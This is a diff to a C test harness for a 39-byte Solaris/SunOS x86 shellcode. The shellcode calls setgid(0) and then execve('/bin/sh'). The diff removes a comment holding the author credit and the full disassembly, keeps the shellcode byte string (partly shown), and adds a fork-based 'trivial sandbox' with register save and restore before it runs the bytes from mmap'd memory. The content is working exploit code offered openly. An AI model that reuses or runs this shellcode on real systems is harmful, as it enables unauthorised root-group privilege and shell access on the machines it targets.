@@ -5,44 +5,13 @@
 #include <strings.h>
 #endif
 
+#include <sys/types.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
-/*
- * SunOS (Solaris) / x86 setgid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
- * 39 bytes shellcode
- *
- * Paulus Gandung Prakosa <gandung@lists.infradead.org>
- *
- * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
- *
- * Disassembly of section .text:
- *
- * 08050428 <_start>:
- * 8050428:       33 f6                   xor    %esi,%esi
- * 805042a:       56                      push   %esi
- * 805042b:       56                      push   %esi
- * 805042c:       33 c0                   xor    %eax,%eax
- * 805042e:       b0 2e                   mov    $0x2e,%al
- * 8050430:       50                      push   %eax
- * 8050431:       cd 91                   int    $0x91
- * 8050433:       56                      push   %esi
- * 8050434:       68 6e 2f 73 68          push   $0x68732f6e
- * 8050439:       68 2f 2f 62 69          push   $0x69622f2f
- * 805043e:       8b dc                   mov    %esp,%ebx
- * 8050440:       56                      push   %esi
- * 8050441:       53                      push   %ebx
- * 8050442:       8b cc                   mov    %esp,%ecx
- * 8050444:       56                      push   %esi
- * 8050445:       56                      push   %esi
- * 8050446:       51                      push   %ecx
- * 8050447:       53                      push   %ebx
- * 8050448:       33 c0                   xor    %eax,%eax
- * 805044a:       b0 3b                   mov    $0x3b,%al
- * 805044c:       50                      push   %eax
- * 805044d:       cd 91                   int    $0x91
- */
+#include "regs/state.h"
 
 #ifndef unused
 #define unused(x) ((void)(x))
@@ -52,6 +21,8 @@ int main(int argc, char **argv) {
   unused(argc);
   unused(argv);
 
+  int ret, wstatus;
+  pid_t pid;
   struct utsname uts;
   char *pcall;
   char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x2e"
@@ -65,15 +36,15 @@ int main(int argc, char **argv) {
 
   if (pcall == MAP_FAILED) {
     perror("mmap()");
-    return -1;
+    ret = -1;
+    goto __fallback;
   }
 
   bzero(&uts, sizeof(struct utsname));
 
-  if (uname(&uts) < 0) {
+  if ((ret = uname(&uts)) < 0) {
     perror("uname()");
-    munmap(pcall, sysconf(_SC_PAGESIZE));
-    return -1;
+    goto __must_unmap;
   }
 
   printf("[*] Machine info\n");
@@ -86,11 +57,40 @@ int main(int argc, char **argv) {
   printf("[*] Copying shellcode into crafted buffer.\n");
   memcpy(pcall, shellcode, strlen(shellcode));
 
-  printf("[*] Executing the shellcode..\n");
-  __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
+  printf("[*] Saving register state..\n");
+  save_regs(&__serialize_regs(cregs));
+
+  printf("[*] Creating trivial sandbox..\n");
+
+  pid = fork();
+
+  if (pid < 0) {
+    perror("fork()");
+    ret = pid;
+    goto __must_restore_regs;
+  }
+
+  if (!pid) {
+    printf("[*] Executing the shellcode..\n");
+    __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
+  } else {
+    waitpid(-1, &wstatus, 0);
+  }
+
+  printf("[*] Restoring register state..\n");
+  store_regs(&__serialize_regs(cregs));
 
   printf("[*] Cleaning up..\n");
   munmap(pcall, sysconf(_SC_PAGESIZE));
 
   return 0;
+
+__must_restore_regs:
+  store_regs(&__serialize_regs(cregs));
+
+__must_unmap:
+  munmap(pcall, sysconf(_SC_PAGESIZE));
+
+__fallback:
+  return ret;
 }
